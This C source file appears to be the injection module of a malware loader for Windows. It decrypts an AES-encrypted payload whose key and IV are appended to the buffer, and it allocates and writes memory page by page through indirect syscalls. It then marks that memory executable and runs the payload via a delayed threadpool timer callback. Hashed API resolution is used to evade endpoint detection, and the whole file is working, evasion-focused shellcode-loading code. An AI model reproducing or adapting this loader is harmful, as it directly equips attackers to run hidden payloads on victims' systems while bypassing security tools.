#include <windows.h>

#include "Structs.h"
#include "Common.h"
#include "FunctionPntrs.h"
#include "CtAes.h"
#include "Debug.h"

extern NT_API g_Nt; // Defined in main.c

#define		PAGE_SIZE					4096
#define		SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) & (~4095) )

// Retrieves the AES key and Iv of the payload, and decrypt 
BOOL FetchAesConfAndDecrypt(IN PBYTE pPayloadBuffer, IN OUT SIZE_T* sPayloadSize, OUT PBYTE* ppDecryptedPayload) {
	
	BOOL			bResult				= FALSE;
	AES256_CBC_ctx	CtAesCtx			= { 0 };
	BYTE			pAesKey	[KEY_SIZE]	= { 0 };
	BYTE			pAesIv	[IV_SIZE]	= { 0 };
	ULONG_PTR		uAesKeyPtr			= NULL,
					uAesIvPtr			= NULL;

	uAesKeyPtr	= ((pPayloadBuffer + *sPayloadSize) - (KEY_SIZE + IV_SIZE));
	uAesIvPtr	= ((pPayloadBuffer + *sPayloadSize) - IV_SIZE);

	Memcpy(pAesKey, uAesKeyPtr, KEY_SIZE);
	Memcpy(pAesIv, uAesIvPtr, IV_SIZE);

	// Updating the payload size
	*sPayloadSize = *sPayloadSize - (KEY_SIZE + IV_SIZE);
	
	// Decrypting
	AES256_CBC_init(&CtAesCtx, pAesKey, pAesIv);
	if (!AES256_CBC_decrypt(&CtAesCtx, pPayloadBuffer, *sPayloadSize, ppDecryptedPayload))
		goto _FUNC_CLEANUP;

	bResult = TRUE;

_FUNC_CLEANUP:
	HeapFree(GetProcessHeap(), 0x00, pPayloadBuffer);	// Free allocated heap in 'GetResourcePayload' function
	return bResult;
}


//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\



BOOL InjectEncryptedPayload(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT PBYTE* pInjectedPayload) {

	// We decrypt the payload to work with the new payload size 
	// NOTE: Decryption is better to occur after creating the RWX memory section. 
	PBYTE		pDecryptedPayload	=	NULL;

	if (!FetchAesConfAndDecrypt(pPayloadBuffer, &sPayloadSize, &pDecryptedPayload)) {
#ifdef DEBUG
		PRINT("[!] Failed To Decrypt Payload - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif 
		return FALSE;
	}

	NTSTATUS	STATUS				=	0x00;
	SIZE_T		sNewPayloadSize		=	SET_TO_MULTIPLE_OF_4096(sPayloadSize),	// rounded up payload size
				sChunkSize			=	PAGE_SIZE;
	DWORD		ii					=	sNewPayloadSize / PAGE_SIZE,			// number of iterations needed 
				dwOldPermissions	=	0x00;
	PVOID		pAddress			=	NULL,
				pTmpAddress			=	NULL;
	PBYTE		pTmpPayload			=	NULL;

	// If not initialized
	if (!g_Nt.bInit)
		return FALSE;

//---------------------------------------------------------------------------------------------------------------------------------------------

	// ALLOCATE - COMMIT + RW
	// This cant be allocated in chunks because there is a risk that the next address to reserve is already reserved for another task ... 
	// This will lead NtAllocateVirtualMemory to return 'STATUS_CONFLICTING_ADDRESSES'.

	// Adding a additional page.
	// This page will remain RO and Reserved
	sNewPayloadSize = sNewPayloadSize + PAGE_SIZE;

	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY))) {
#ifdef DEBUG
		PRINT("[!] NtAllocateVirtualMemory[1] Failed With Error: 0x%0.8X - %s.%d \n", STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
		return FALSE;
	}

	// Fixing up the base address and size to leave a RO page behind
	sNewPayloadSize = sNewPayloadSize - PAGE_SIZE;
	pAddress		= (PVOID)((ULONG_PTR)pAddress + PAGE_SIZE);

#ifdef DEBUG
	PRINT("\n");
	PRINT("\t>>> Injecting Payload At: 0x%p \n", pAddress);
	PRINT("\t>>> Raw Payload Size: %d \n", (int)sNewPayloadSize);
#endif 

//---------------------------------------------------------------------------------------------------------------------------------------------

	// Starting from the base address 
	pTmpAddress = pAddress;

	// ALLOCATE - COMMIT + RW
	for (DWORD i = 0; i < ii; i++) {

		SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
		if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE))) {
#ifdef DEBUG
			PRINT("[!] NtAllocateVirtualMemory[2][%d] Failed With Error: 0x%0.8X - %s.%d \n", i, STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
			return FALSE;
		}

		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

//---------------------------------------------------------------------------------------------------------------------------------------------

	// Starting from the base address 
	pTmpAddress = pAddress;
	pTmpPayload = pDecryptedPayload;

	// WRITE
	for (DWORD i = 0; i < ii; i++) {
		
		Memcpy (pTmpAddress, pTmpPayload, PAGE_SIZE);

		pTmpPayload		= (PBYTE)((ULONG_PTR)pTmpPayload + PAGE_SIZE);
		pTmpAddress		= (PBYTE)((ULONG_PTR)pTmpAddress + PAGE_SIZE);
	}


//---------------------------------------------------------------------------------------------------------------------------------------------

	// Starting from the base address 
	pTmpAddress = pAddress;

	// RWX
	for (DWORD i = 0; i < ii; i++) {
		SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
		if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READWRITE, &dwOldPermissions))) {
#ifdef DEBUG
			PRINT("[!] NtProtectVirtualMemory[%d] Failed With Error: 0x%0.8X - %s.%d \n", i, STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
			return FALSE;
		}

		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

	*pInjectedPayload = pAddress;
	return TRUE;
}


//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\


//\
https://learn.microsoft.com/en-us/windows/win32/procthread/using-the-thread-pool-functions

VOID ExecutePayload(IN PVOID pInjectedPayload) {

	TP_CALLBACK_ENVIRON		tpCallbackEnv	= { 0 };
	FILETIME				FileDueTime		= { 0 };
	ULARGE_INTEGER			ulDueTime		= { 0 };
	PTP_TIMER				ptpTimer		= NULL;

	if (!pInjectedPayload)
		return;

	fnCreateThreadpoolTimer			pCreateThreadpoolTimer		= (fnCreateThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32dll_DJB2), CreateThreadpoolTimer_DJB2);
	fnSetThreadpoolTimer			pSetThreadpoolTimer			= (fnSetThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32dll_DJB2), SetThreadpoolTimer_DJB2);
	fnWaitForSingleObject			pWaitForSingleObject		= (fnWaitForSingleObject)GetProcAddressH(GetModuleHandleH(kernel32dll_DJB2), WaitForSingleObject_DJB2);

	if (!pCreateThreadpoolTimer || !pSetThreadpoolTimer || !pWaitForSingleObject) {
#ifdef DEBUG
		PRINT("[!] Failed To Fetch One Or More Function Pointers - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif 
		return;
	}

	// 'InitializeThreadpoolEnvironment' is an inline function - cant be hashed 
	InitializeThreadpoolEnvironment(&tpCallbackEnv);

	if (!(ptpTimer = pCreateThreadpoolTimer((PTP_TIMER_CALLBACK)pInjectedPayload, NULL, &tpCallbackEnv))) {
#ifdef DEBUG
		PRINT("[!] CreateThreadpoolTimer Failed With Error: %d - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif
		return;
	}

	// Set the timer to fire in PAYLOAD_EXEC_DELAY seconds.
	ulDueTime.QuadPart			= (ULONGLONG)-(PAYLOAD_EXEC_DELAY * 10 * 1000 * 1000);
	FileDueTime.dwHighDateTime	= ulDueTime.HighPart;
	FileDueTime.dwLowDateTime	= ulDueTime.LowPart;

	pSetThreadpoolTimer(ptpTimer, &FileDueTime, 0x00, 0x00);

	pWaitForSingleObject((HANDLE)-1, INFINITE);
}